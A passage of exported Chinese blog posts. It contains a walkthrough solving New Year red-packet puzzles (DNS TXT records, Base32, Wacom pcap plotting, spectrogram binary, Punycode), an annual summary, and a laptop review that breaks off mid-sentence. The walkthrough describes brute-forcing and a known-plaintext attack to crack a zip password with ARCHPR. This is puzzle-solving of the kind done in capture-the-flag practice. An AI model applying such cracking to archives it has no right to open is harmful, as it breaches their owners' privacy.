04:29:19","description":"\n<blockquote><p><del>又到了水文章的时间呢</del></p></blockquote>\n<p>先说明一下，这篇文章原本不是在计划中的，而原来说好的「在路上的两篇」文章<del>绝对不会咕</del>。我自己的红包答案本来打算直接塞在年度总结里的，结果发现稍微有些长，再加上我还花了一些时间解了<a href=\"https://milkice.me/\">奶冰</a>的红包解谜游戏，就打算把两个解谜过程放在一起单独写一篇文章。<del>真是个水文章的好理由</del>（被打死</p>\n<h1>奶<del> 子 </del>冰的红包</h1>\n<p>奶冰的红包题目比我的难多了，所以让我们先从难的开始吧。首先看一下<a href=\"https://milkice.me/2019/12/31/2019-summary/\">题目</a>：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-2.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1524\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-2.jpg\" alt=\"\" width=\"746\" height=\"410\"></a>\n<p>入口是 <code>happy.2020.milkice.me</code>，扔到浏览器里面表示找不到 IP，那么大概率就是 DNS 的 TXT 记录了，查一下得到 <code>nb2hi4dthixs63ljnrvwsy3ffzwwkl3tivrvezluomxxg5dsmvqw2ltqmnqxa3th</code>。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-3.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1525\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-3.jpg\" alt=\"\" width=\"896\" height=\"278\"></a>\n<p>第一眼没看出来是什么编码，直觉是 BaseXX 系列的编码，加上提示“不只有 Base64”，可以推断出是 Base32，转大写解码得到 <code>https://milkice.me/sEcRets/stream.pcapng</code>。是个 URL，下载得到一个 Wireshark 文件，打开一看是和某 USB 设备的通讯抓包。<del>不会做，不做了。</del></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-4.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1526\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-4.jpg\" alt=\"\" width=\"1500\" height=\"813\"></a>\n<p>奶冰提示我“Google 上搜得到”，结合第二条提示搜索“wacom pcapng”找到了<a href=\"https://blogs.tunelko.com/2017/02/05/bitsctf-tom-and-jerry-50-points/\">这篇文章</a>（<del>这™就是答案啊</del>）。看起来是一样的套路，即通过解析数据得到数位板上画的内容，于是按文章的思路筛选出数位板发给主机的数据，导出，然后再用 tshark 导出文本数据。本来我想直接用文章中的 POC 的，结果折腾半天因为源的蜜汁原因库没装上，于是按文章中给出的数据结构自己写了段代码，分别导出 X、Y 轴数据扔进 Excel 画散点图。（<del>别问我为什么用 Excel，因为我手边没有更好的工具了</del>）</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1528\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8.jpg\" alt=\"\" width=\"1280\" height=\"530\"></a>\n<p><span>翻车现场之一</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-13.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1539\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-13.jpg\" alt=\"\" width=\"1000\" height=\"286\"></a>\n<p><span>懵逼奶冰.webp</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-1.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1533\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-1.jpg\" alt=\"\" width=\"1500\" height=\"462\"></a>\n<p>看得出有手写文字，不过是上下颠倒的，翻转图片得 <code>https://milkice.me/2020/uso.zip</code>。是个 zip，下载打开一看，有密码。<del>不会解，不做了。</del> 第一反应是暴力解密码，但是暴力跑了 15 分钟还是没有跑出来。暴力太不优雅了，肯定不是正确思路，但奶冰什么都不肯说了。不过在这时我终于发现第一个红包口令码就藏在压缩包的注释中，Get。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-15.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1544\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-15.jpg\" alt=\"\" width=\"806\" height=\"593\"></a>\n<p>然而题还没解完，回去看提示，看到提供了 osu 谱面下载，于是打算不管怎么样先下载来看看。然而 osu 谱面下载要登录，只好又花了几分钟找到第三方站点，成功下载。这时候可以注意到 uso.zip 里有个同名文件（432314 Mike Greene – Bill Nye the Science Guy Theme Song (Chinese Intro).osz），可以联想到是明文攻击。好吧，上 ARCHPR，十秒解出。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-5.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1530\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-5.jpg\" alt=\"\" width=\"462\" height=\"643\"></a>\n<p><span>现场还原.jpg</span></p>\n<p>.osz 文件并不是明文，猜测是压缩包（和 .pptx 一个思路嘛），于是改后缀 .zip 顺利打开。然后红包口令码就藏在奶冰的 .osu 文件中了，由提示可知是明文，打开即可得到。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-14.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1542\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-14.jpg\" alt=\"\" width=\"457\" height=\"255\"></a>\n<h1>我的红包</h1>\n<p>相比起来<a href=\"https://flyhigher.top/diary/1464.html\">我的题目</a>就简单很多了嘛…三天时间一共发出了 25 个红包，包括一位重复领取的🌚，比前几年还是多了一些的。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-16.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-16.jpg\" alt=\"\" width=\"500\" height=\"306\" class=\"aligncenter size-full wp-image-1554\"></a>\n<p><span>这位同学以后请不要多次领取🌚</span></p>\n<p>那么来看看答案吧。</p>\n<h2>第一阶段</h2>\n<p><code>=CE=B1=D1=85t=D0=BEn.=D1=96m/=D1=81=D0=BEd=D0=B5_=D0=BEf_2020_=E2=92=88m=CF=81=D0=B7</code></p>\n<p>首先观察字符串，可以发现 <code>.</code> <code>/</code> <code>_</code> 等一些 ASCII 字符原样留在了字符串中，而其他字符被由 <code>=</code> 和十六进制构成的某种编码所替代。如果你正好有所了解，你应该能认出这是 Quoted-printable 编码，这是一种常用于邮件中的编码，可以用<a href=\"https://mothereff.in/quoted-printable\">这个页面</a>解码。如果你不了解，你也应该可以发现这种编码和 URL 编码非常相似。如果你把 <code>=</code> 替换为 <code>%</code>，那么你就可以用各种方法顺利地把它按 URL 编码来进行解码，最后可以得到 <code>αхtоn.іm/соdе_оf_2020_⒈mρз</code>。这个字符串里大部分字符都不是 ASCII 字符，只是长得像而已。根据第一个提示“全是 ASCII 字符”，按样子把字符串用 ASCII 字符抄一遍，可以得到最终 URL 为 <code>axton.im/code_of_2020_1.mp3</code>。</p>\n<h2>第二阶段</h2>\n<p>下载音频，可以听出音频是经过某种处理的白噪音。白噪音的特点是各频段的功率都均匀分布，在白噪音上做文章，很容易就可以联想到线索藏在频谱中。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8-1.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1534\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8-1.jpg\" alt=\"\" width=\"1200\" height=\"719\"></a>\n<p>频谱被处理成了 24×3 的网格，结合第二条提示“24×3，横向读取”可以推断出是将频谱当作二进制读取，得到 <code>01111001 01110010 01100011 00101110 01101101 01100101 00101111 00110010 00110000</code>，转为 ASCII 字符可得 <code>yrc.me/20</code>。</p>\n<h2>第三阶段</h2>\n<p>打开上一步得到的页面，提示要求输入十位数密码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-10.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1536\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-10.jpg\" alt=\"\" width=\"663\" height=\"460\"></a>\n<p>如果你在上一步注意到了这个音频文件奇怪的属性，你可以反应过来这里的密码就是 <code>2000202020</code>。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-11.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1537\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-11.jpg\" alt=\"\" width=\"421\" height=\"651\"></a>\n<p>如果你没有注意到，查看页面代码可以看到一条注释 <code>&lt;!-- Tips: the attribute of the audio --&gt;</code> 将你引导向音频文件的属性。输入密码，解锁即可进入下一步。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-9.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1535\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-9.jpg\" alt=\"\" width=\"397\" height=\"223\"></a>\n<h2>第四阶段</h2>\n<p>可以看到是一张图片，内容为“<del>.JPG</del>”和“.ZIP”。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2020-1-scaled.jpg\"><img loading=\"lazy\" class=\"aligncenter size-large wp-image-1532\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2020-1-scaled.jpg?imageView2/1/w/724/h/1024/interlace/1/q/90#\" alt=\"\" width=\"724\" height=\"1024\"></a>\n<p>和去年一样的套路，下载图片，将后缀名改为 .zip 然后打开，可以看到 README.txt。</p>\n<h2>最后一步</h2>\n<p>查看 README.txt 的内容，可以了解到需要去 🤔.axton.cc 获取红包口令码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-12.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1538\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-12.jpg\" alt=\"\" width=\"1131\" height=\"278\"></a>\n<p>扔到浏览器里会出现奶冰同款找不到 IP，于是可以联想到 TXT 记录。唯一的问题是 🤔 这个 Emoji 需要如何处理。域名使用 Punycode 将 Unicode 字符转换为 ASCII 字符，特点是以 <code>xn--</code> 开头。如果你把上面这个域名扔进浏览器，你会发现它变成了 <code>xn--wp9h.axton.cc</code>。然后查询 TXT 记录，即可得到红包口令码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-7.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1527\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-7.jpg\" alt=\"\" width=\"804\" height=\"557\"></a>\n","link":"https://flyhigher.top/develop/1519.html"},{"title":"无垠 2019 年度总结","date":"2019-12-29 12:25:52","description":"\n<p>又是时间飞快的一年…写 2018 总结的情景似乎还在眼前，转眼居然已经到 2019 年末了。</p>\n<p>2019 年，发生了太多事情，包括真的转折了人生的高考，这也导致我博客更新的不多（难以置信居然才更了两篇…），不过两篇技术性文章已经在路上了，可以期待一下。</p>\n<p>2019 年我也学了不少东西（单指技术方面），比如终于认真学了 Vue（但是还要练手）。书买了一大堆，看完的倒是没几本orz</p>\n<p>呼，好吧，是时候回顾一下充满坎坷的这一年了。2019 年还剩下最后两天，希望 2020 年，我能做得更好。</p>\n<h1>一些数据</h1>\n<p>照惯例先来看看一些数据吧。今年是统计系统完整统计了的第二年，终于可以和去年的数据比较一下了。以下数据的统计范围是 2019年1月1日0时至 2019年12月29日20时。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 26,901 (<span>+4%</span>)，年 PV 76,583 (<span>+3%</span>)，日均 UV 73.7，平均停留时间 5分13秒 (<span>-13.8%</span>)，平均跳出率 53% (<span>+20.5%</span>)。一年有效文章数 2 (<span>-50%</span>)，新增评论 439 条。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/fh.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/fh.jpg\" alt=\"\" width=\"1000\" height=\"1143\" class=\"aligncenter size-full wp-image-1511\"></a>\n<p>有趣的是今年文章数腰斩，访问数反而小有提升。<del>如果我哪天不更新了，访问数是不是可以无限大呢？</del></p>\n<p>今年博客最大的改动就是把整体风格切换到了 Material Design 2（当然这是 <a href=\"https://flyhigher.top/develop/788.html\">MDx</a> 中的可选功能，给自己打个广告2333），此外还有比较失败的 WebP 改造计划，因为和缓存冲突已经回滚了。<a href=\"https://flyhigher.top/develop/1245.html\">ABS 系统</a>进展不大，主要是真的没有太多时间，还是要再学习一个。</p>\n<h2>个人主页</h2>\n<p>虽然个人主页的 TODO List 列了老长，但今年完全没有更新，也没有推广，从今年 8 月底开始还莫名被某墙认证了，直到 11 月底才恢复，于是今年总访问量比去年少了很多，</p>\n<p>有多少呢？这么少：总 UV 2,141 (<span>-65.9%</span>)，总 PV 2,744 (<span>-66.6%</span>)，日均 UV 6 (<span>-65.9%</span>)，平均停留时间 62秒 (<span>+19.2%</span>)。主要来源是知乎和 V2EX，还有一些甚至是从微信来的。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/axton.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/axton.jpg\" alt=\"\" width=\"1000\" height=\"1103\" class=\"aligncenter size-full wp-image-1512\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 8 次，新增 171 commits，2 种语言的翻译，Star 数增加了 175，现有 408。感谢所有人的支持，尤其是 <a href=\"https://github.com/Sn0bzy\" rel=\"noopener noreferrer\" target=\"_blank\">Hasan CAN</a>, <a href=\"https://github.com/yechs\" rel=\"noopener noreferrer\" target=\"_blank\">Ye Shu</a>, <a href=\"https://github.com/StarryLeo\" rel=\"noopener noreferrer\" target=\"_blank\">StarryLeo</a>, <a href=\"https://github.com/DCTewi\" rel=\"noopener noreferrer\" target=\"_blank\">冻葱Tewi</a>, <a href=\"https://github.com/syfxlin\" rel=\"noopener noreferrer\" target=\"_blank\">Otstar Lin</a> 等为 MDx 做出了不小贡献的你们。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：<a href=\"https://flyhigher.top/photograph/1309.html\">上手</a> DJI OSMO Pocket</li>\n<li>四月：最后一次参加浙江省普通高中学业水平考试</li>\n<li>五月：MDx 喜提 300 Stars</li>\n<li>六月：高考 <del>炸了，差亿点点上浙大</del>\n</li>\n<li>六月：入手了 Oneplus 7 Pro</li>\n<li>六月：和同学一起去成都重庆旅行</li>\n<li>六月：第一次近距离感受到地震</li>\n<li>六月：<a href=\"https://flyhigher.top/diary/1411.html\">入手</a>了一台雷蛇灵刃 15，目前是主力机</li>\n<li>七月：参与组织 THE Hack 2019 活动</li>\n<li>七月：面基了 <a href=\"https://itroy.cc/\" rel=\"noopener noreferrer\" target=\"_blank\">Tory</a>, Bie Shi 和 <a href=\"https://oxz.me/\" rel=\"noopener noreferrer\" target=\"_blank\">FHYunCai</a>\n</li>\n<li>八月：一个人去厦门武汉转了一圈，拍了自己的第一个 Vlog</li>\n<li>八月：入手了一个 Kindle Paperwhite 4，没有泡面可以压，于是用来看英文小说了</li>\n<li>八月：加入 TEDxNingbo 志愿者团队</li>\n<li>八月：和 Ralph 面基</li>\n<li>八月：入手了一个 Yubikey</li>\n<li>九月：人生第一次参加雅思考试 <del>7分，蛮开心的</del>\n</li>\n<li>十月：入手了一个 Samsung Galaxy Watch Active 2 <del>觉得不值</del>\n</li>\n<li>十一月：MDx 达到 400 Stars</li>\n<li>十一月：为 TEDxNingbo 设计开发的 H5 上线</li>\n<li>十一月：入手了第一台胶片相机，试图入坑胶片摄影</li>\n<li>十一月：参加 TEDxNingbo 2019 大会</li>\n<li>十二月：<del>我 Cytus II 入门了</del>\n</li>\n</ul>\n<h1>跨年红包</h1>\n<p>这算「传统习俗」了。和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2020年1月2日。</p>\n<p>今年的解谜旅程，从下面这个字符串开始。</p>\n<p><code>=CE=B1=D1=85t=D0=BEn.=D1=96m/=D1=81=D0=BEd=D0=B5_=D0=BEf_2020_=E2=92=88m=CF=81=D0=B7</code></p>\n<p>由于今年的题目比以前稍微难了一些，所以今年的红包金额还是比较大的，而且不限量，尽你所能试一试吧。</p>\n<p>一点你可能用得上的提示：URL 里全是 ASCII 字符 / 24×3，横向读取。</p>\n<p><a href=\"https://flyhigher.top/develop/1519.html\">答案</a>已公布。</p>\n<h1>跨年海报</h1>\n<p>这算是另一个「传统习俗」（笑）。因为我有做跨年海报的习惯，所以以下就是今年份的海报啦。</p>\n<p>用了 C4D+PS，还有我的一整个下午。</p>\n<p>提前祝各位新年快乐！</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/2020-f-web-scaled.jpg\"><img loading=\"lazy\" class=\"aligncenter wp-image-1467 size-large\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/2020-f-web-scaled.jpg?imageView2/1/w/724/h/1024/interlace/1/q/90#\" alt=\"\" width=\"724\" height=\"1024\"></a>\n","link":"https://flyhigher.top/diary/1464.html"},{"title":"Razer Blade 灵刃 15 2019 精英版简评","date":"2019-07-27 19:22:58","description":"\n<blockquote><p>“你这什么电脑啊，也是惠普的么？比我的还重一点欸。”同学拿着暗影精灵说。<br>\n“emmmm….杂牌电脑，买灯送的。”</p></blockquote>\n<h1>故事</h1>\n<p>考完高考，该换台电脑了。我此前在用的是一台 Dell Inspiron 15 7560，一台从商务本的角度来看还算不错的笔记本，平常用来写写代码还不错，但在我剪视频以及折腾 C4D 的时候明显有些力不从心，更别提运行大型游戏了。于是趁着这次换机机会，我打算换一台<strong>性能还算不错，又能带着走</strong>的笔记本。这么想着，我列出了我的需求：</p>\n<ul>\n<li>性能较高</li>\n<li>便携性好（薄、重量轻、电池续航长等）</li>\n<li>外观低调</li>\n<li>预算最高 2.5w</li>\n</ul>\n<p>由于并不喜欢外观太张扬的「游戏本风格」，我希望我选择的笔记本外观干净低调。此外，由于我最近正在折腾学习 ML，我希望显卡可以是 20 系的（虽然 10 系也不是不能用…）。满足以上需求的只有以下几种选择：</p>\n<ul>\n<li>技嘉 Aero 15</li>\n<li>Razer Blade 15 2019 精英版</li>\n<li>msi GS75</li>\n</ul>\n<p>至于败家之眼由于太过张扬，直接被我排除了。在仅剩的三个选择里面，Razer Blade 15 的外观在我看来是最低调简约的，而且屏幕有 1080P+240Hz 和 4K+触摸两种都很不错的规格可选，唯一的问题大概就是在 10 代 U 都快能买到的时候，Razer Blade 15 的 CPU 还是 8 代的。</p>\n<p>（哦…缺点大概还有比较贵吧…）</p>\n<p>在我纠结的时候，我联系的卖家告诉我 Razer Blade 9 代 U 的版本已经到国内总代了，如果顺利的话他可以在 6.16 第一批直接给我发货；另外他也可以为高考生提供优惠。既然都这样了还有什么好纠结的，买了！选了 2070 Max-Q/16GB/256GB/1080P/240Hz 的版本，下单付款，果然在 16 号顺利入手。</p>\n<p>最终确定这个配置是因为 2080 的版本太贵，但是 4K 触摸屏版本只在 2080 版本上有，只好选了 1080P；另外 512 GB 的版本比我买的 256 GB 贵了 2K，于是决定自己买块 1T 的盘换掉。</p>\n<h1>开箱</h1>\n<p>包装箱也很低调，只在侧面露出一抹骚绿。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13.jpg\" alt=\"\" width=\"2500\" height=\"1875\" class=\"aligncenter size-full wp-image-1398\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13-300x225.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13-768x576.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13-1024x768.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p>正面和背面。照片是在用了一个多月以后拍的，看起来有点脏。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8.jpg\" alt=\"\" width=\"2000\" height=\"1349\" class=\"aligncenter size-full wp-image-1394\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8-300x202.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8-768x518.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8-1024x691.jpg 1024w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10.jpg\" alt=\"\" width=\"2300\" height=\"1630\" class=\"aligncenter size-full wp-image-1386\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10-300x213.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10-768x544.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10-1024x726.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>卸下后盖十颗梅花螺丝就能打开后盖。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14.jpg\" alt=\"\" width=\"2000\" height=\"2636\" class=\"aligncenter size-full wp-image-1399\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14-228x300.jpg 228w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14-768x1012.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14-777x1024.jpg 777w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p>SSD、内存条和无线网卡都在触手可及的地方。这张图里我已经换好了 SSD。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15.jpg\" alt=\"\" width=\"2500\" height=\"1790\" class=\"aligncenter size-full wp-image-1400\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15-300x215.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15-768x550.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15-1024x733.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p>网卡是 AX200NGW，Intel 第一款支持 Wi-Fi 6 的网卡，好评。内存为双通道 DDR4，支持 XMP，不过我懒得折腾了。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16.jpg\" alt=\"\" width=\"2000\" height=\"1795\" class=\"aligncenter size-full wp-image-1401\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16-300x269.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16-768x689.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16-1024x919.jpg 1024w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p><strong>后盖只有一处卡扣，在靠近转轴一侧中间的位置，安装后盖的时候需要注意下。此外后盖和机身卡得比较紧，安装的时候需要注意下后盖有没有完全卡入机身。</strong></p>\n<p>然后开机。硬盘复制和升级系统什么的就不再赘述了。自带 Windows 10 家庭版，为了装 Docker 我升级到了专业版。</p>\n<p>从开箱到现在，我已经使用这台电脑一月有余。讲讲使用上的感受吧。</p>\n<h1>机身</h1>\n<p><strong>有人说 Blade 就是 Windows 版的 Macbook，这个说法其实还算贴切。</strong>整个金属材质的 A 面只有一个 Razer 的 Logo，屏幕点亮的时候会一同亮起。B 面是支持 Windows Hello 的摄像头、屏幕和一个比较低调的 Razer Logo。屏幕三面边框比较窄，观感不错。<strong>而一旦打开屏幕，Windows Hello 就会开始识别你的面部，并极快地解锁进入桌面，很舒服。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11.jpg\" alt=\"\" width=\"2000\" height=\"1500\" class=\"aligncenter size-full wp-image-1396\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11-300x225.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11-768x576.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11-1024x768.jpg 1024w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p><span>和 Windows Hello 说声 Hello？</span></p>\n<p><strong>B 面边缘有一圈非常细的胶圈，可以在屏幕闭合的时候起密封的作用（不过实测效果不大…）。</strong>C 面是键盘、扬声器、开机键和触控板，这些后面会细说。<strong>D 面是塑料材质，有两条蛮厚的橡胶条把机身垫高</strong>，猜测是为了散热。</p>\n<p>Razer Blade 15 的接口比较丰富。左侧：</p>\n<ul>\n<li>电源接口</li>\n<li>2 个 USB 3.2 Gen 2 Type-A 接口</li>\n<li>1 个 3.5 mm 组合音频插孔</li>\n</ul>\n<p>右侧：</p>\n<ul>\n<li>1 个 USB 3.2 Gen 2 Type-A 接口</li>\n<li>1 个雷电 3 接口（通过 GPU 输出）</li>\n<li>1 个 HDMI 2.0B 接口</li>\n<li>1 个 MiniDisplayPort 1.4 接口</li>\n<li>安全锁孔</li>\n</ul>\n<p>这些接口日常使用完全够用，通过雷电 3 也能获得不错的拓展性（不过雷电 3 似乎需要跟独显抢带宽…）。</p>\n<p><strong>机身边缘比较锐，不过出乎意料地不是非常割手。</strong>之前在用的 Dell Inspiron 15 7560 边缘极其锋利，非常割手，难受。现在（相对来说）打字舒服很多了，好评。</p>\n<p><strong>机身很薄，薄到有点出乎意料。</strong>官方数据只有 17.8mm，就算加上把机身垫高了的橡胶条也还是比一枚硬币矮。然而毕竟还是塞了这么多硬件进去，看起来轻薄但<strong>实际上一点都不轻</strong>，官方数据 2.07 kg，加上砖头一样的电源适配器，<strong>出趟门其实还是有点累的。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9.jpg\" alt=\"\" width=\"2300\" height=\"1136\" class=\"aligncenter size-full wp-image-1395\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9-300x148.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9-768x379.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9-1024x506.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<h1>续航</h1>\n<p>出乎意料，<strong>续航还不错</strong>，达到了我的预期。电池达到了 80Wh，我日常一个 VSCode 写代码，一个 Chrome 查资料，<strong>续航可以达到 8 小时出头</strong>，就算是在玩 HITMAN 1 小时后，电量仍能剩余一半左右。也就是说，短时间的移动办公完全不是问题，可以不带上厚重的电源适配器，算是解决了一部分「重」的问题吧。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12.jpg\" alt=\"\" width=\"2500\" height=\"1860\" class=\"aligncenter size-full wp-image-1397\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12-300x223.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12-768x571.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12-1024x762.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p><span>电源适配器有点大</span></p>\n<h1>屏幕</h1>\n<p><strong>爽！真的爽！240Hz 刷新率带来的是实打实的流畅感</strong>，和 90Hz 那种需要用一段时间才能感受到的流程感不同， 240Hz 带来的是在桌面上划划鼠标都能感受到的异常流畅的感觉。</p>\n<p>不过受限于这块 2070 Max-Q，很多游戏游戏都没能完全利用这块屏幕的性能，再加上我不玩 FPS 游戏，高刷新率对我来说意义不大，<strong>这块屏幕的 240Hz 